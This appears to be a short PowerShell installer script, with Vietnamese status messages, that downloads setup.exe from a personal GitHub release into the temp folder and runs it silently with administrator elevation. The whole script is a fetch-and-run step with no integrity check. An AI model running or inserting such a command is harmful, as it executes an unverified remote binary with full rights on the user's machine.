$Url = "https://github.com/ChrisDemon0811/Tool/releases/download/v2/setup.exe"
$Output = "$env:TEMP\setup.exe"

Write-Host "Dang tai phan mem..."
Invoke-WebRequest -Uri $Url -OutFile $Output

Write-Host "Dang cai dat..."
Start-Process -FilePath $Output -ArgumentList "/S" -Verb RunAs -Wait

Write-Host "Cai dat hoan tat!"
